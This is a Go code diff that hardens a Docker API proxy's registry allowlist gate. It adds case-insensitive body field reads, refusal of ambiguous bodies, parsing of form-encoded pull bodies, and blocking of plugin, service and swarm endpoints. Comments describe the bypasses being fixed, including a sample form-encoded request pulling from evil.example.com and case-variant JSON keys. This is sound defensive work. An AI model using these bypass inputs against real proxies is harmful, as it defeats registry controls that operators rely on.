@@ -9,11 +9,13 @@ import (
 	"io"
 	"net"
 	"net/http"
+	"net/url"
 	"os"
 	"regexp"
 	"strings"
 	"time"
 
+	"github.com/wslkit/skrog/internal/apibody"
 	"github.com/wslkit/skrog/internal/winpath"
 )
 
@@ -33,11 +35,21 @@ type AuditSink interface {
 // terms the user typed.
 //
 // The map is the LIVE request body, passed without copying so that judging a
-// request costs nothing on the hot path. Two consequences for an
-// implementation: do not mutate it — this interface decides, it does not
-// edit — and do not retain it past the call, because bind-path translation
-// rewrites the same map immediately afterwards, so a reference kept for a log
-// would later read as translated.
+// request costs nothing on the hot path. Three consequences for an
+// implementation:
+//
+//   - Do not mutate it. This interface decides; it does not edit.
+//   - Do not retain it past the call. Bind-path translation rewrites the same
+//     map immediately afterwards, so a reference kept for a log would later
+//     read as translated.
+//   - **Read fields with internal/apibody, never with body["Image"].** The map
+//     has the keys the client sent, and dockerd decodes into structs, so it
+//     honours `{"image": …}` and `{"IMAGE": …}` identically. An exact-key
+//     lookup misses both and the daemon acts on a field the gate never saw.
+//     Keys are deliberately not rewritten here, because several Docker objects
+//     (Labels, Volumes, PortBindings) are keyed by DATA and folding their case
+//     would corrupt the request. Bodies that spell a guarded field two ways are
+//     refused before any gate runs.
 type Gate interface {
 	DenyCreate(body map[string]any) (reason string, denied bool)
 }
@@ -391,6 +403,16 @@ func rewriteCreateBody(req *http.Request, gate Gate, translate SourceTranslator)
 		return nil, nil
 	}
 
+	// A body that spells a guarded field two ways is refused before anything
+	// judges it. dockerd decodes into structs, where case is ignored and the
+	// LAST spelling wins; a decoded map keeps both and loses the order, so the
+	// gate would judge one spelling while the daemon acted on the other.
+	// Refusing is the only honest answer -- see internal/apibody.
+	if field, bad := apibody.Ambiguous(raw); bad {
+		return errors.New("request body spells " + field +
+			" more than one way; refusing rather than guessing which the engine would use"), nil
+	}
+
 	// Admission control runs BEFORE translation (#120), so a rule about where
 	// bind mounts may come from sees the Windows path the user typed rather
 	// than the /mnt/c form the engine will get.
@@ -428,14 +450,14 @@ func translateHostConfig(body map[string]any, translate SourceTranslator) (bool,
 	if translate == nil {
 		translate = winpath.ToWSL
 	}
-	hc, ok := body["HostConfig"].(map[string]any)
+	hc, ok := apibody.Map(body, "HostConfig")
 	if !ok {
 		return false, nil
 	}
 
 	var changed bool
 
-	if rawBinds, ok := hc["Binds"].([]any); ok {
+	if rawBinds, ok := apibody.Slice(hc, "Binds"); ok {
 		binds := make([]string, 0, len(rawBinds))
 		for _, b := range rawBinds {
 			s, ok := b.(string)
@@ -458,12 +480,12 @@ func translateHostConfig(body map[string]any, translate SourceTranslator) (bool,
 			for i, s := range translated {
 				next[i] = s
 			}
-			hc["Binds"] = next
+			apibody.SetField(hc, "Binds", next)
 		}
 	}
 
 	// --mount syntax, and what compose emits for long-form volumes.
-	if mounts, ok := hc["Mounts"].([]any); ok {
+	if mounts, ok := apibody.Slice(hc, "Mounts"); ok {
 		for _, m := range mounts {
 			mount, ok := m.(map[string]any)
 			if !ok {
@@ -619,27 +641,108 @@ var (
 	// `docker build` next to it ran to completion, pulling `FROM busybox` off
 	// docker.io with the allowlist forbidding it.
 	buildPath = regexp.MustCompile(`^(/v[0-9.]+)?/(build|session|grpc)$`)
+
+	// unattributablePath matches endpoints that can fetch or run an image
+	// WITHOUT naming it anywhere this gate can judge (#322).
+	//
+	//   /plugins/pull, /plugins/*/upgrade   fetch from an arbitrary registry
+	//                                       named in `remote`, and a plugin gets
+	//                                       host device and mount access.
+	//   /services/create, /services/*/update, /swarm/init
+	//                                       a swarm task pulls and runs an image
+	//                                       from a spec this gate does not parse.
+	//
+	// They are refused on exactly the same ground as a build: with an allowlist
+	// in force, traffic that cannot be attributed to an allowed registry must not
+	// proceed. Refusing beats parsing a swarm TaskSpec and getting it subtly
+	// wrong, which is how the first two bypasses in this file happened.
+	unattributablePath = regexp.MustCompile(
+		`^(/v[0-9.]+)?/(plugins/pull|plugins/.+/upgrade|services/create|services/.+/update|swarm/init)$`)
 )
 
 // pullTarget reports the image a pull request names, if it is one.
 //
-// The reference lives in the query string rather than a body: `fromImage` plus
-// an optional `tag`. A request with `fromSrc` instead is an import from a
-// tarball, which names no registry and is left alone.
+// `fromImage` plus an optional `tag`. A request with `fromSrc` instead is an
+// import from a tarball, which names no registry and is left alone.
+//
+// It must read the reference the DAEMON will act on, and that is not simply the
+// query string. dockerd calls httputils.ParseForm and then r.Form.Get, and Go's
+// ParseForm merges an application/x-www-form-urlencoded BODY into r.Form ahead
+// of the query values -- so the body wins. Reading only the query was a
+// complete bypass of this gate:
+//
+//	POST /v1.44/images/create HTTP/1.1
+//	Content-Type: application/x-www-form-urlencoded
+//
+//	fromImage=evil.example.com/bad&tag=latest
+//
+// With no query string at all this used to report isPull=false, the gate never
+// ran, and the daemon pulled from a registry the allowlist forbids.
+//
+// The body is buffered and restored, so the request still forwards byte for
+// byte -- the caller writes req.Body downstream.
 func pullTarget(req *http.Request) (image string, isPull bool) {
 	if req.Method != http.MethodPost || !imageCreatePath.MatchString(req.URL.Path) {
 		return "", false
 	}
-	q := req.URL.Query()
-	from := q.Get("fromImage")
+
+	get := req.URL.Query().Get
+	if isFormEncoded(req) {
+		if form, ok := formBody(req); ok {
+			// Exactly dockerd's precedence: a body value shadows the query.
+			get = func(k string) string {
+				if v, ok := form[k]; ok && len(v) > 0 {
+					return v[0]
+				}
+				return req.URL.Query().Get(k)
+			}
+		}
+	}
+
+	from := get("fromImage")
 	if from == "" {
 		return "", false
 	}
-	if tag := q.Get("tag"); tag != "" && !strings.ContainsAny(from, "@") {
+	if tag := get("tag"); tag != "" && !strings.ContainsAny(from, "@") {
 		from += ":" + tag
 	}
 	return from, true
 }
+
+// isFormEncoded reports whether the body is urlencoded, which is the only case
+// where ParseForm reads it.
+func isFormEncoded(req *http.Request) bool {
+	ct := req.Header.Get("Content-Type")
+	if i := strings.IndexByte(ct, ';'); i >= 0 {
+		ct = ct[:i]
+	}
+	return strings.EqualFold(strings.TrimSpace(ct), "application/x-www-form-urlencoded")
+}
+
+// formBody parses the urlencoded body and puts it back for forwarding.
+func formBody(req *http.Request) (url.Values, bool) {
+	if req.Body == nil {
+		return nil, false
+	}
+	raw, err := io.ReadAll(io.LimitReader(req.Body, maxFormBody))
+	req.Body.Close()
+	// Restore unconditionally: a read error must not also eat the request.
+	req.Body = io.NopCloser(bytes.NewReader(raw))
+	if err != nil {
+		return nil, false
+	}
+	v, err := url.ParseQuery(string(raw))
+	if err != nil {
+		return nil, false
+	}
+	return v, true
+}
+
+// maxFormBody bounds the buffering above. A urlencoded /images/create body is a
+// few dozen bytes in the only cases that exist; anything larger is not a form
+// this gate needs to understand, and must not be read into memory on the
+// strength of a header.
+const maxFormBody = 1 << 20
 
 // isImageBuild reports whether the request is a build, by either route.
 //
@@ -647,5 +750,6 @@ func pullTarget(req *http.Request) (image string, isPull bool) {
 // /session or /grpc — so a gate that allows builds is unaffected by their being
 // matched here, and only a gate that refuses builds sees them at all.
 func isImageBuild(req *http.Request) bool {
-	return req.Method == http.MethodPost && buildPath.MatchString(req.URL.Path)
+	return req.Method == http.MethodPost &&
+		(buildPath.MatchString(req.URL.Path) || unattributablePath.MatchString(req.URL.Path))
 }
